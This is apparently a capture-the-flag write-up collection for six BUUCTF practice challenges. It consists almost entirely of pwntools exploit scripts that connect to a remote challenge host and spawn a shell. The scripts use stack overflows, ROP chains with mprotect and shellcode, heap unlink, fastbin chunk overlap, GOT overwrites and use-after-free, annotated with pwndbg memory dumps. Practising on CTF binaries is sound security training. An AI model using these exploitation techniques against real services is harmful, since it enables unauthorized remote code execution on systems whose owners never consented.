# buuctf wp part3

## cmcc_simplerop

```python
    from pwn import *
    from LibcSearcher import *
    context.arch='i386'

    # the program was static complied, so just use the mprotect to change some segment's policy to execve shellcode,
    # or get shell by int 0x80(execve("/bin/sh",0,0)) in the program

    # p = process('../Desktop/simplerop')
    p = remote('node3.buuoj.cn',28168)
    elf = ELF('../Desktop/simplerop',checksec=False)

    def shellcode():
        mprotect_addr = elf.sym['mprotect']
        shellcode_addr = 0x080E9000
        main = elf.sym['main']
        shellcode = asm(shellcraft.sh())
        payload = 'A'*0x20 + p32(mprotect_addr) + p32(main) + p32(shellcode_addr) + p32(len(shellcode)) + p32(0x7)
        # the length of overflow need to debug to find it
        # mprotect(const void *start, size_t len, int prot),0x7 means this part of menmory could be read,write,execve
        p.send(payload)
        sleep(1)

        gets_plt = elf.sym['read']
        payload = 'A'*0x18 + p32(gets_plt) + p32(shellcode_addr) + p32(0) + p32(shellcode_addr) + p32(len(shellcode))
        # the length of overflow was changed, when debug could find it
        # get shellcode to section .bss
        p.send(payload)
        sleep(1)
        p.sendline(shellcode)
        sleep(1)
        p.interactive()

    def int80():
        main = elf.sym['main']
        read_addr = elf.sym['read']
        bss_addr = 0x080EAFB4
        int80_addr = 0x080493e1 # int 0x80
        gadgets1 = 0x0809da8a # pop eax ; pop ebx ; pop esi ; pop edi ; ret
        gadgets2 = 0x0806e850 # pop edx ; pop ecx ; pop ebx ; ret
        payload = 'A'*0x20 + flat([read_addr, main, 0, bss_addr, 8])
        # the length of overflow need to debug to find it
        p.recvuntil("Your input :")
        p.send(payload)
        sleep(1)
        p.send('/bin/sh\x00')
        p.recvuntil("Your input :")

        payload = 'A'*0x18 + flat([gadgets1, 0xb, bss_addr, 0, 0, gadgets2, 0, 0, bss_addr, int80_addr])
        # prepare the register for int 0x80 to excute funtction execve("/bin/sh",0,0)
        # the length of overflow was changed, when debug could find it
        p.send(payload)
        sleep(1)
        p.interactive()
    int80() # this way could get shell both local and server
    # shellcode() # this way could get shell locally
```

## ez_pz_hackover_2016

```python
from pwn import *
context.arch='i386'

# the program disabled NX(no execute),so just shellcode

# p = process('./ez_pz')
p = remote('node3.buuoj.cn',26803)

p.recvuntil('Yippie, lets crash: ')
buff_addr = int(p.recvuntil('\n',drop=True),16)
log.info('buff_addr = %#x'%buff_addr)

shellcode = asm(shellcraft.sh())
payload = 'crashme' + '\x00'
# pass the judgement 'if ( !result )''
payload += 'a'*18
# make stack overflow by memcpy to return a address
payload += p32(buff_addr-0x1c)
# this offsset 0x1c need debbug to find it,
# notice, find the function vlun's stack address which store shellcode,
# and calculate the ofsset between program leaked address and we find stack address
# why not the leaked address, because the data in stack was changed
payload += shellcode

p.recvuntil("> ")
p.sendline(payload)
sleep(1)
p.interactive()
```

## get_started_3dsctf_2016

```python
    from pwn import *
    context.arch = 'i386'

    def local(p):
        payload = 'A'*0x38 + p32(ELF('../Desktop/get_started').sym['get_flag']) + p32(0x08048A20) + p32(0x308CD64F) + p32(0x195719D1)
        # call function get_flag, and transfer the argv at sametime
        p.sendline(payload)
        print p.recv()
    # local(process('./get_started'))
    # when connected the server, this way can't get flag successly

    def remoted(p):
        elf = ELF('../Desktop/get_started')
        mprotect_addr = elf.sym['mprotect']
        shellcode_addr = 0x080EA000
        # when we debugging, we could find try to change the policy of section .bss was failed,
        # but at the process, we find a address of menmory could be changed (0x080EA000)
        main = elf.sym['main']
        shellcode = asm(shellcraft.sh())
        payload = 'A'*0x38 + p32(mprotect_addr) + p32(main) + p32(shellcode_addr) + p32(len(shellcode)) + p32(0x7)
        # mprotect(const void *start, size_t len, int prot),0x7 means this part of menmory could be read,write,execve
        p.sendline(payload)
        sleep(1)

        gets_plt = elf.sym['gets']
        payload = 'A'*0x38 + p32(gets_plt) + p32(main) + p32(shellcode_addr)
        # get shellcode to section .bss
        p.sendline(payload)
        sleep(1)
        p.sendline(shellcode)

        payload = 'A'*0x38 + p32(shellcode_addr)
        p.sendline(payload)
        sleep(1)
        p.interactive()

    # the way get flag loacly were not effectively when remote the server
    # but we find function mprotect im program, so we could change the policy of some where and write shellcode  to get shell
    remoted(remote('node3.buuoj.cn',25170))
```

## hitcon2014_stkof

```python
from pwn import *
from LibcSearcher import *
context.arch='amd64'
# context.log_level="DEBUG"
context.log_level="INFO"

# p = process('./stkof')
p = remote('node3.buuoj.cn',28528)
elf = ELF('./stkof',checksec=False)
bss_heap = 0x602140

def read(content,size,index):
    p.sendline('2')
    p.sendline(str(index))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil('OK\n',timeout=1)

def malloc(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n',timeout=1)

def free(index):
    p.sendline('3')
    p.sendline(str(index))

def debug():
    gdb.attach(p)
    pause()

malloc(0x100)   # index 1

malloc(0x30)    # index 2
malloc(0x80)    # index 3
# debug()

payload = p64(0)
payload += p64(0x20)
payload += p64(bss_heap + 16 - 0x18)
payload += p64(bss_heap + 16 - 0x10)
payload += p64(0x20)
payload = payload.ljust(0x30,'a')

payload += p64(0x30)
payload += p64(0x90)

read(payload,len(payload),2)
# debug()

# addr                prev                size                 status              fd                bk
# 0xed1000            0x0                 0x1010               Used                None              None
# 0xed2010            0x0                 0x110                Used                None              None
# 0xed2120            0x0                 0x410                Used                None              None
# 0xed2530            0x0                 0x40                 Freed                0x0              0x20
# 0xed2570            0x30                0x90                 Used                None              None
# pwndbg> x/16g 0xed2530
# 0xed2530:   0x0000000000000000  0x0000000000000041
# 0xed2540:   0x0000000000000000  0x0000000000000020
# 0xed2550:   0x0000000000602138  0x0000000000602140
# 0xed2560:   0x0000000000000020  0x6161616161616161
# 0xed2570:   0x0000000000000030  0x0000000000000090 <== set prev_inuse to 0x90(size= 0x90,prev_inuse= 0)
# 0xed2580:   0x0000000000000000  0x0000000000000000
# 0xed2590:   0x0000000000000000  0x0000000000000000
# 0xed25a0:   0x0000000000000000  0x0000000000000000

free(3)
# debug()

# pwndbg> x/16g 0x0000000000602140
# 0x602140:   0x0000000000000000  0x0000000002309020
# 0x602150:   0x0000000000602138  0x0000000000000000 <== bss_heap[2] point to 0x0000000000602138
# 0x602160:   0x0000000000000000  0x0000000000000000
# 0x602170:   0x0000000000000000  0x0000000000000000
# 0x602180:   0x0000000000000000  0x0000000000000000
# 0x602190:   0x0000000000000000  0x0000000000000000
# 0x6021a0:   0x0000000000000000  0x0000000000000000
# 0x6021b0:   0x0000000000000000  0x0000000000000000


payload = "A"*8 + flat([elf.got['free'], elf.got['puts'], elf.got['atoi']])
read(payload,len(payload),2)
# debug()

# pwndbg> x/16g 0x602138
# 0x602138:   0x4141414141414141  0x0000000000602018 <== bss_heap[0] was changed and point to free@got
# 0x602148:   0x0000000000602020  0x0000000000602088 <== also bss_heap[1] and bss_heap[2] was changed, and point to puts@got,atoi@got
# 0x602158:   0x0000000000000000  0x0000000000000000
# 0x602168:   0x0000000000000000  0x0000000000000000
# 0x602178:   0x0000000000000000  0x0000000000000000
# 0x602188:   0x0000000000000000  0x0000000000000000
# 0x602198:   0x0000000000000000  0x0000000000000000
# 0x6021a8:   0x0000000000000000  0x0000000000000000


payload = p64(elf.plt['puts'])
read(payload,len(payload),0)
# debug()

# pwndbg> x/16g 0x0000000000602018
# 0x602018 <free@got.plt>:    0x0000000000400760  0x00007f1ece149690 <== 0x0000000000400760 was point to puts@plt
# 0x602028 <fread@got.plt>:   0x00007f1ece1481a0  0x0000000000400786
# 0x602038 <__stack_chk_fail@got.plt>:    0x0000000000400796  0x00007f1ece12f800
# 0x602048 <alarm@got.plt>:   0x00007f1ece1a6200  0x00007f1ece0fa740
# 0x602058 <fgets@got.plt>:   0x00007f1ece147ad0  0x00007f1ece110eb0
# 0x602068 <__gmon_start__@got.plt>:  0x00000000004007f6  0x00007f1ece15e130
# 0x602078 <fflush@got.plt>:  0x00007f1ece1477a0  0x00007f1ece110ea0
# 0x602088 <atoi@got.plt>:    0x00007f1ece110e80  0x0000000000000000

free(1)
# function free here will call the reall free in os,
# but the free@got was rewrite to point to put@plt,
# so it wiil call the puts and use index 1's content which is puts@got as a parameter of puts
p.recvuntil('OK\n')
puts_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
log.success('puts_addr = %#x',puts_addr)

libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh = %#x'%(system_addr, binsh))

payload = p64(system_addr)
read(payload, len(payload), 2)
# debug()

# pwndbg> x/16g 0x0000000000602088
# 0x602088 <atoi@got.plt>:    0x00007fe7dfab2390  0x0000000000000000 <== 0x00007fe7dfab2390 was point to the reall address of system
# 0x602098:   0x0000000000000000  0x0000000000000000
# 0x6020a8:   0x0000000000000000  0x0000000000000000
# 0x6020b8:   0x0000000000000000  0x00007fe7dfe32620
# 0x6020c8:   0x0000000000000000  0x00007fe7dfe318e0
# 0x6020d8:   0x0000000000000000  0x0000000000000000
# 0x6020e8:   0x0000000000000000  0x0000000000000000
# 0x6020f8:   0x0000000000000000  0x0000000000000003

p.send(p64(binsh))
# Previous step, atoi@got was rewrite to point to system,
# from the program, when finish some function(ex.read,free,malloc,etc),
# it will call atoi to transfer our input to get corret option,
# but here we rewrite the atoi,
# so it will call system and use our input which is p64(binsh) as a parameter of system
p.interactive()
```

## hitcontraining_heapcreator

```python
from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux')
# context.log_level = "DEBUG"

# p = process('./heapcreator')
p = remote('node3.buuoj.cn',29662)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)


def Create(size,content):
    p.recvuntil("Your choice :")
    p.send('1')
    p.recvuntil("Size of Heap : ")
    p.send(str(size))
    p.recvuntil("Content of heap:")
    p.send(content)

def Edit(index,content):
    p.recvuntil("Your choice :")
    p.send('2')
    p.recvuntil("Index :")
    p.send(str(index))
    p.recvuntil("Content of heap : ")
    p.send(content)

def Show(index):
    p.recvuntil("Your choice :")
    p.send('3')
    p.recvuntil("Index :")
    p.send(str(index))
    p.recvuntil("Size : ")
    size = int(p.recvuntil('\n',drop=True))
    p.recvuntil("Content : ")
    content = p.recvuntil('\n',drop=True)
    return size,content

def Delete(index):
    p.recvuntil("Your choice :")
    p.send('4')
    p.recvuntil('Index :')
    p.send(str(index))

def Exit():
    p.recvuntil("Your choice :")
    p.send('5')

def debug():
    gdb.attach(p)
    pause()

free_got = ELF('./heapcreator',checksec=False).got['free']
Create(0x18,'AAAA')
Create(0x18,'BBBB')
# 0x182a000:    0x0000000000000000  0x0000000000000021 <== chunk1's struct
# 0x182a010:    0x0000000000000018  0x000000000182a030 <== ponit to chunk1's size and content
# 0x182a020:    0x0000000000000000  0x0000000000000021 <== chunk1's content
# 0x182a030:    0x0000000041414141  0x0000000000000000
# 0x182a040:    0x0000000000000000  0x0000000000000021 <== chunk2's strcut
# 0x182a050:    0x0000000000000018  0x000000000182a070
# 0x182a060:    0x0000000000000000  0x0000000000000021 <== chunk2's content
# 0x182a070:    0x0000000042424242  0x0000000000000000

# debug()
Edit(0, '/bin/sh\x00'+"a"*0x10+"\x41")
# 0xb5f000: 0x0000000000000000  0x0000000000000021 <== chunk1's struct
# 0xb5f010: 0x0000000000000018  0x0000000000b5f030 <== ponit to chunk1's size and content
# 0xb5f020: 0x0000000000000000  0x0000000000000021 <== chunk1's content
# 0xb5f030: 0x0068732f6e69622f  0x6161616161616161
# 0xb5f040: 0x6161616161616161  0x0000000000000041 <== chunk2's strcut's fake size
# 0xb5f050: 0x0000000000000018  0x0000000000b5f070 <== point to chunk2's size and content
# 0xb5f060: 0x0000000000000000  0x0000000000000021 <== chunk2's content
# 0xb5f070: 0x0000000042424242  0x0000000000000000

# overwrite heap 2's size to 0x41

# debug()
Delete(1)
# debug()
# fastbins
# 0x20: 0x12b6060 <== chunk2's content
# 0x30: 0x0
# 0x40: 0x12b6040 <== chunk2's size
# 0x50: 0x0
# 0x60: 0x0
# 0x70: 0x0
# 0x80: 0x0
# Create(0x30,'aaaa')
# 0x925000: 0x0000000000000000  0x0000000000000021 <== chunk1's struct
# 0x925010: 0x0000000000000018  0x0000000000925030 <== ponit to chunk1's size and content
# 0x925020: 0x0000000000000000  0x0000000000000021 <== chunk1's content
# 0x925030: 0x0068732f6e69622f  0x6161616161616161
# 0x925040: 0x6161616161616161  0x0000000000000041 <== new chunk2's content
# 0x925050: 0x0000000061616161  0x0000000000925070
# 0x925060: 0x0000000000000000  0x0000000000000021 <== new chunk2's struct
# 0x925070: 0x0000000000000030  0x0000000000925050 <== point to new chunk2's size and content

# trigger heap 2's size to fastbin 0x40
# heap 2's content to fastbin 0x20

Create(0x30,p64(0)*4+p64(0x30)+p64(free_got))
# new heap 2's struct will point to old heap 2's content, size 0x20
# new heap 2's content will point to old heap 2's strcut, size 0x30
# that is to say we can overwrite new heap 2's struct
# here we overwrite its heap content pointer to free@got(when we print, printf will print the loacation which free@got point to)
size,content=Show(1)
# 0x785040: 0x6161616161616161  0x0000000000000041 <== new chunk2's content
# 0x785050: 0x0000000000000000  0x0000000000000000
# 0x785060: 0x0000000000000000  0x0000000000000000 <== new chunk2's size which was overwrite right now
# 0x785070: 0x0000000000000030  0x0000000000602018 <== point to new shcunk2's size and content

# leak address
log.success('size = %d, content = %#x'%(size,u64(content.ljust(8,'\x00'))))
# debug()

free_addr = u64(content.ljust(8,'\x00'))
# libc_base = free_addr - libc.sym['free']
# system_addr = libc_base + libc.sym['system']
libc = LibcSearcher('free',free_addr)
libc_base = free_addr - libc.dump('free')
system_addr = libc_base + libc.dump('system')
log.info('system_addr = %#x',system_addr)

# overwrite free@got with system addr
Edit(1, p64(system_addr))
# trigger system("/bin/sh")
# debug()
Delete(0)
p.interactive()
```

## hitcontraining_uaf

```python
from pwn import *
context.arch='i386'
# context.log_level="DEBUG"

# p = process('./hacknote')
p = remote('node3.buuoj.cn',27576)

def add(size,content):
    p.recvuntil("Your choice :")
    p.send('1')
    p.recvuntil("Note size :")
    p.send(str(size))
    p.recvuntil("Content :")
    p.send(content)

def delete(index):
    p.recvuntil("Your choice :")
    p.send('2')
    p.recvuntil("Index :")
    p.send(str(index))

def prints(index):
    p.recvuntil("Your choice :")
    p.send('3')
    p.recvuntil("Index :")
    p.send(str(index))

def debug():
    gdb.attach(p)
    pause()

add(0x20,'AAAA')
# add one and free it,and add new smaller
# could not rewrite the function print
# pwndbg> parseheap
# addr                prev                size                 status              fd                bk
# 0x972c000           0x0                 0x10                 Used                None              None
# 0x972c010           0x0                 0x28                 Freed                0x0              None
# 0x972c038           0x0                 0x10                 Used                None              None
# pwndbg> x/16w 0x972c000
# 0x972c000:  0x00000000  0x00000011  0x080485fb  0x0972c040
# 0x972c010:  0x00000000  0x00000029  0x00000000  0x00000000
# 0x972c020:  0x00000000  0x00000000  0x00000000  0x00000000
# 0x972c030:  0x00000000  0x00000000  0x00000000  0x00000011
# pwndbg> x/16w 0x0972c040
# 0x972c040:  0x43434343  0x00000000  0x00000000  0x00020fb9
# 0x972c050:  0x00000000  0x00000000  0x00000000  0x00000000
# 0x972c060:  0x00000000  0x00000000  0x00000000  0x00000000
# 0x972c070:  0x00000000  0x00000000  0x00000000  0x00000000
# pwndbg>

add(0x20,'BBBB')
delete(0)
delete(1)
add(8,p32(ELF('hacknote',checksec=False).sym['magic']))
# add(8,'CCCC')
# when we add twice and free them both, and add another smaller one, the new added's content was just start at first added's function print
# so, we just to rewrite the func print and get shell by the backdoor function(magic)
# later, just call  print_note() to execve the fake function print(magic), and get shell
# debug()
# pwndbg> parseheap
# addr                prev                size                 status              fd                bk
# 0x9f9a000           0x0                 0x10                 Used                None              None
# 0x9f9a010           0x0                 0x28                 Freed                0x0              None
# 0x9f9a038           0x0                 0x10                 Used                None              None
# 0x9f9a048           0x0                 0x28                 Freed          0x9f9a010              None
# pwndbg> x/16w 0x9f9a000
# 0x9f9a000:  0x00000000  0x00000011  0x43434343  0x09f9a018
# 0x9f9a010:  0x00000000  0x00000029  0x00000000  0x00000000
# 0x9f9a020:  0x00000000  0x00000000  0x00000000  0x00000000
# 0x9f9a030:  0x00000000  0x00000000  0x00000000  0x00000011


prints(0)
# debug()
p.interactive()
```
